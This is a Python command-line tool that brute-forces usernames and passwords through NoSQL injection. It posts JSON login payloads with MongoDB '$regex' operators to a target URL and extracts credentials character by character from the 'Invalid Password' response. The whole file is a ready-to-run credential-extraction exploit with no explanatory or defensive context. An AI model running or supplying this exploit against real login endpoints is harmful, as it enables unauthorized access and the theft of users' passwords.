import argparse
import requests
import string
import os
import sys

parser = argparse.ArgumentParser(description='Brute force username and password')
parser.add_argument('-w', '--wordlist', help='Wordlist of users', required=False)
parser.add_argument('-o', '--output', help='Output file', required=False)
parser.add_argument('-u', '--url', help='Url of the request', required=True)

args = parser.parse_args()
args = vars(args)
url = args['url']

user_list = []
user_and_password = {}
chars_to_test = string.digits + string.ascii_letters


def get_password(user, password):
    for c in chars_to_test:
        print(c, end='')
        sys.stdout.flush()
        payload = {"user": user, "password": {"$regex": f"^{password}{c}"}, }
        request = requests.post(url, json=payload)
        if 'Invalid Password' not in request.text:
            payload = {"user": user, "password": f"{password}{c}"}
            request = requests.post(url, json=payload)
            if 'Invalid Password' not in request.text:
                return f"{password}{c}"
            return get_password(user, f"{password}{c}")
        print('\b', end='')
    return 'Password not found'


def get_passwords():
    for user in user_list:
        user = str(user)
        password = get_password(user, '')
        user_and_password[user] = password


def get_users(user):
    for c in chars_to_test:
        print(c, end='')
        sys.stdout.flush()
        payload = {"user": {"$regex": f"^{user}{c}"}, "password": "wrongpasss"}
        request = requests.post(url, json=payload)
        if 'Invalid Password' in request.text:
            payload = {"user": f"{user}{c}", "password": "wrongpasss"}
            request = requests.post(url, json=payload)
            if 'Invalid Password' in request.text:
                user_list.append(f"{user}{c}")
            get_users(f"{user}{c}")
        print('\b', end='')


def dict_to_file(filename):
    f = open(filename, "a")
    for element in user_and_password:
        f.write(f"{element}:{user_and_password[element]}")
    f.close()


def wordlist_to_users(path_file):
    if not os.path.isfile(path_file):
        raise Exception(f'{path_file} Not Found!')
    global user_list
    f = open(path_file, "r")
    user_list = f.read().split('\n')


def main():
    if args['wordlist'] is not None:
        wordlist_to_users(args['wordlist'])
        get_passwords()
    else:
        get_users('')
        print(user_list)
        get_passwords()
        print(user_and_password)
    if args['output'] is not None:
        dict_to_file(args['output'])


main()

